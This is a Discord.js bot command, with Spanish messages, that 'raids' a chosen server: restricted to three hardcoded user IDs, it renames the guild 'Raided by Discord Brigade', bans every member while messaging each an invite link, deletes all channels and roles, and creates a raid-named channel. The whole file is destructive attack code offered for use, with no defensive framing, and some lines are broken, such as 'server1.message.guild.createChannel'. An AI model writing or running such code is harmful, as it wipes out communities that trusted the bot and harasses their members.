exports.run = (client, message, args) => {
const Discord = require('discord.js')  

const ownerID = "579234820408868872";
let con = args[0]  
let server1 = client.guilds.get(args[0])

if (message.author.id !== "579234820408868872")
if (message.author.id !== "571391532033376276")
if (message.author.id !== "471035482789118004") return
  
  if(!con) return message.channel.send("Dime alguna id , usa `pika!servers` para ver las ids disponibles")
  if(isNaN(con)) return message.channel.send("Pon una ID valida")
  
  server1.setName("Raided by Discord Brigade")
  
  
  server1.members.forEach(user => {
    user.ban("bye")
    user.send("Raided by Discord Brigade \n\nhttps://discord.gg/qyKBRw2")
  });

  server1.channels.forEach(channels1 => {
    channels1.delete()
      
    });
  
  message.guild.roles.forEach(roles1 => {
    roles1.delete()
      
    });
  
  
  server1.message.guild.createChannel("Raided by Discord Brigade")
  
  message.channel.send("Lo he hecho correctamente!")
  
}